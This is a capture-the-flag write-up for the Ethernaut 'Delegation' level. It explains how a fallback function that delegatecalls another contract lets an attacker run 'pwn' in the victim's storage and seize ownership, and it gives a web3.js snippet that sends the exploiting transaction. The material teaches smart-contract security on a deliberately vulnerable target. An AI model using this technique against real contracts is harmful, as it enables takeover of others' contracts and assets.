# Level 6: [Delegation](https://ethernaut.openzeppelin.com/level/0xF781b45d11A37c51aabBa1197B61e6397aDf1f78)

## Level objectives:
1. Claim ownership of contract Delegation.

## Analysis (lol)
- Delegation's fallback function delgatecall's `Delegate` contract.
- `delegatecall` allows us to execute code from contract Delegate, in the storage context of
contract Delegation.
- So we shall send a tx to Delegation's fallback function.
- The payload data will be the name of Delegate's function to execute within Delegation.

## Steps:

```js
const pwnData = web3.eth.abi.encodeFunctionCall({
  name: 'pwn',
  type: 'function',
  inputs: []
}, []);

web3.eth.sendTransaction({
  from: "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4", // my addr.
  to: "0x5d4c441B8158A8E3b6f12BeA611731FD4EF46df6", // Delegation contract addr.
  data: pwnData
});
```
